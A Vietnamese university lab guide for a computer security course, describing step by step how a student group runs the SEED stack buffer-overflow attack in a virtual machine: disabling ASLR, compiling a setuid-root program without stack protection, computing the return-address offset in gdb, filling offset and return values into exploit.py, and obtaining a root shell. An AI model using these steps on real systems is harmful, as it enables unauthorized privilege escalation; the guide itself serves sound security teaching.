# Hướng dẫn thực hiện yêu cầu (từng bước, kèm cách tính toán)

**Môn:** Nhập môn An toàn máy tính — HUS
**Nhóm 3:** Lê Văn Cường (23001842), Nguyễn Việt Anh (23001829), Nguyễn Mai Hoàng Anh (23001824)

> Tài liệu này hướng dẫn chạy toàn bộ bài lab trên **máy ảo SEED Ubuntu** (hoặc Ubuntu 32-bit tương đương) để **quay video demo**. Mỗi bước ghi rõ lệnh và cách tính.

---

## 0. Chuẩn bị môi trường

Máy này (nơi phát triển) **chưa có `gcc` và thư viện 32-bit**, nên việc biên dịch và tấn công thực tế cần làm trên **máy ảo SEED Ubuntu**. Nếu dùng Ubuntu thường, cài trước:

```bash
sudo apt update
sudo apt install -y gcc-multilib gdb python3
```

Kiểm tra:

```bash
gcc -m32 -xc -E - </dev/null >/dev/null && echo "32-bit OK"
```

---

## 1. Tắt ASLR

ASLR làm địa chỉ stack đổi mỗi lần chạy → khó tấn công. Tắt để demo:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

(Kiểm tra: `cat /proc/sys/kernel/randomize_va_space` phải ra `0`.)

---

## 2. Biên dịch `stack.c` và gán quyền root

```bash
cd code
gcc -m32 -g -O0 -fno-stack-protector -z execstack -o stack stack.c
sudo chown root stack
sudo chmod 4755 stack
ls -l stack        # phải thấy '-rwsr-xr-x ... root ...'  (chữ 's' = setuid)
```

Hoặc dùng Makefile:

```bash
make            # biên dịch
make setuid     # gán quyền root
```

> **Lưu ý VLA + execstack:** với một số bản gcc mới, `char buffer[bufsize]` (VLA) có thể làm trình biên dịch chèn kiểm tra. Nếu gặp khó, có thể biên dịch thêm `-U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0`. Trên SEED VM mặc định không cần.

---

## 3. Chạy thử để biết kích thước buffer của nhóm

```bash
# cần có badfile trước (tạm thời dùng file rác cũng được để chạy thử in thông số)
python3 exploit.py        # tạo badfile mẫu
./stack 23001842
```

Màn hình in ra, ví dụ:

```
MSV (seed)        : 23001842
Khoang buffer     : [100, 300]
Kich thuoc buffer : 237 byte
```

Ghi lại **kích thước buffer** (ở đây giả sử 237). Vì `srand(MSV)` là tất định, con số này **cố định cho mỗi MSV**. Nhóm nên chạy đúng MSV mà nhóm chọn nộp bài (ví dụ dùng MSV của Cường: 23001842).

---

## 4. BƯỚC 1 — Xác định *NƠI* đặt return address (dùng gdb)

```bash
gdb -q stack
```

Trong gdb:

```gdb
(gdb) b bof                 # đặt breakpoint tại hàm bof
(gdb) run 23001842          # chạy với MSV của nhóm
(gdb) p $ebp                # in địa chỉ frame pointer   -> vd $1 = 0xffffcf68
(gdb) p &buffer             # in địa chỉ buffer          -> vd $2 = 0xffffcedc
(gdb) p/d ($ebp + 4) - (int)&buffer   # offset theo hệ 10
```

### Cách tính offset

Return address nằm ngay **trên** saved ebp, tức tại `$ebp + 4`. Vậy:

```
offset = ($ebp + 4) − &buffer
```

Ví dụ với số liệu trên:

```
offset = (0xffffcf68 + 4) − 0xffffcedc
       = 0xffffcf6c − 0xffffcedc
       = 0x90  = 144 (byte)
```

> ⚠️ **Các địa chỉ trên chỉ là VÍ DỤ.** Nhóm phải đọc số thật từ gdb trên máy của mình và **chụp màn hình** làm bằng chứng (lưu vào `slides/images/`).

**Chụp màn hình cần có:** cửa sổ gdb hiển thị `$ebp`, `&buffer` và phép trừ ra offset.

---

## 5. BƯỚC 2 — Xác định *GIÁ TRỊ* của return address

Ta muốn CPU nhảy vào **giữa vùng NOP sled**, nên chọn:

```
ret = &buffer + δ
```

với δ là khoảng dư an toàn (ví dụ `0x64 = 100`). Ví dụ:

```
ret = 0xffffcedc + 0x64 = 0xffffcf40
```

Có thể chọn δ lớn hơn (ví dụ nửa khoảng NOP) để chắc chắn rơi vào NOP sled, miễn là `ret` vẫn nằm **trước** vùng shellcode trong badfile khi ánh xạ lên stack.

> **Chụp màn hình cần có:** cách lấy `&buffer` và phép cộng ra `ret`.

### Vì sao cách này đúng?
- Đã tắt ASLR ⇒ địa chỉ `&buffer` khi chạy thật = khi chạy trong gdb.
- NOP sled trải dài từ đầu badfile; `ret` trỏ vào vùng đó nên CPU trượt tới shellcode ở cuối.

---

## 6. BƯỚC 3 — Chỉnh `exploit.py` và tạo badfile

Mở `code/exploit.py`, sửa đúng 2 dòng:

```python
offset = 0x90          # thay bằng offset nhóm vừa tính (vd 144)
ret    = 0xffffcf40    # thay bằng ret nhóm vừa tính
```

Tạo badfile:

```bash
python3 exploit.py
# [+] Da tao badfile (517 byte) ...
```

Kiểm tra nhanh nội dung (tùy chọn):

```bash
xxd badfile | head        # đầu file là 90 90 90 ..., có 4 byte ret tại offset
```

---

## 7. BƯỚC 4 — Thực hiện tấn công

```bash
./stack 23001842
```

Nếu thành công:

```
MSV (seed)        : 23001842
Kich thuoc buffer : 237 byte
# id
uid=0(root) gid=1000(seed) groups=1000(seed) ...
# whoami
root
```

- Dấu nhắc đổi thành `#`, `id`/`whoami` cho **root** ⇒ thành công.
- Dòng `Returned Properly` **không** xuất hiện (vì luồng đã bị chuyển hướng).

> **Chụp màn hình cần có:** terminal hiển thị root shell (`uid=0`).

### Nếu chưa thành công — xử lý
| Hiện tượng | Nguyên nhân thường gặp | Cách xử lý |
|------------|------------------------|------------|
| `Segmentation fault` | offset/ret sai | Kiểm tra lại số gdb, thử tăng/giảm δ |
| `Returned Properly` in ra | ret không trúng NOP | Tăng δ, kiểm tra little-endian |
| shell nhưng `uid` không phải 0 | thiếu setuid(0) / quên `chmod 4755` | Kiểm tra shellcode & quyền file |
| địa chỉ đổi mỗi lần | ASLR còn bật | Chạy lại lệnh tắt ASLR ở mục 1 |

---

## 8. Quay video & nộp bài

1. **Quay màn hình** toàn bộ 4 bước trên, có thuyết minh (có thể dùng OBS Studio / SimpleScreenRecorder).
2. Trong video **nêu rõ phần nào dùng AI** và mức độ (xem slide 14 / `giai-thich-kien-thuc.md`).
3. **Upload lên YouTube** ở chế độ **Unlisted** (Không công khai): khi upload → Visibility → *Unlisted*.
4. Nộp theo form trên Classroom: `exploit.py`, file thuyết trình (PDF/PPTX), và **link video**.

---

## 9. Biên dịch slide trên Overleaf

1. Vào overleaf.com → New Project → Upload Project, hoặc tạo project rồi upload thư mục `slides/`.
2. Mở `main.tex`. Menu → **Compiler: pdfLaTeX** (mặc định).
3. Bấm **Recompile**. File dùng phông Latin Modern + `babel` tiếng Việt nên nhẹ, biên dịch được trên bản free.
4. **Chèn ảnh thật:** copy ảnh gdb vào thư mục `images/`, rồi thay dòng `\screenshot{5}{3.5}` trong `main.tex` bằng:
   ```latex
   \includegraphics[width=\linewidth]{images/ten-anh.png}
   ```
5. Xuất PPTX (nếu form yêu cầu PowerPoint): tải PDF từ Overleaf, rồi dùng công cụ chuyển PDF→PPTX, hoặc chụp từng slide dán vào PowerPoint. (PDF beamer vẫn là định dạng trình chiếu hợp lệ.)

---

## 10. Checklist nộp bài
- [ ] `exploit.py` đã điền offset/ret thật, tạo được root shell.
- [ ] File thuyết trình (PDF/PPTX) có: phân công, các bước + sơ đồ, ảnh gdb, cách tính offset & ret.
- [ ] Video YouTube **Unlisted**, có thuyết minh + khai báo AI.
- [ ] Đã nêu rõ mức độ dùng AI trong cả video và tài liệu.
